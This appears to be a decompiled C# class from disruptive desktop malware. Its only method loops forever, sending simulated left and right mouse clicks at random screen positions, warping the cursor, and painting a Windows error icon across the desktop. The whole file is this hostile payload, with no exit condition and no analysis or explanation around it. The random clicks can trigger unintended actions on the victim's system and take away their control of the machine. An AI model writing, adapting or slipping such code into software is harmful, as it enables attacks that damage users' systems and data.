using System;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;

// Token: 0x0200002A RID: 42
public class GClass9
{
	// Token: 0x060000C0 RID: 192 RVA: 0x00005E28 File Offset: 0x00004028
	public void method_0()
	{
		int width = Screen.PrimaryScreen.Bounds.Width;
		int height = Screen.PrimaryScreen.Bounds.Height;
		int num = 0;
		int num2 = 0;
		int num3 = 10;
		int num4 = 10;
		Icon icon = GClass3.smethod_0("C:\\Windows\\System32\\user32.dll", 3, true);
		for (;;)
		{
			Random random = new Random();
			if (random.Next(2) != 1)
			{
				goto IL_17D;
			}
			int num5 = -10;
			IL_5A:
			num3 = num5;
			num4 = ((random.Next(2) == 1) ? (-10) : 10);
			num = random.Next(width);
			num2 = random.Next(height);
			if (random.Next(3) == 1)
			{
				GClass2.mouse_event(2U, num, num2, 0U, UIntPtr.Zero);
				GClass2.mouse_event(4U, num, num2, 0U, UIntPtr.Zero);
			}
			else if (random.Next(3) != 1)
			{
				if (random.Next(2) == 1)
				{
					GClass2.SetCursorPos(random.Next(width), random.Next(height));
				}
			}
			else
			{
				GClass2.mouse_event(8U, num, num2, 0U, UIntPtr.Zero);
				GClass2.mouse_event(16U, num, num2, 0U, UIntPtr.Zero);
			}
			if (num < width && num2 < height && num > 0 && num2 > 0)
			{
				for (int i = 0; i < width; i += 50)
				{
					IntPtr dc = GClass2.GetDC(IntPtr.Zero);
					using (Graphics graphics = Graphics.FromHdc(dc))
					{
						graphics.DrawIcon(icon, num += num3, num2 += num4);
						GClass2.DeleteDC(dc);
						if (!GClass5.bool_1)
						{
							Thread.Sleep(10);
							goto IL_184;
						}
						Thread.Sleep(1);
						goto IL_184;
					}
					goto IL_17D;
					IL_184:;
				}
				continue;
			}
			continue;
			IL_17D:
			num5 = 10;
			goto IL_5A;
		}
	}
}
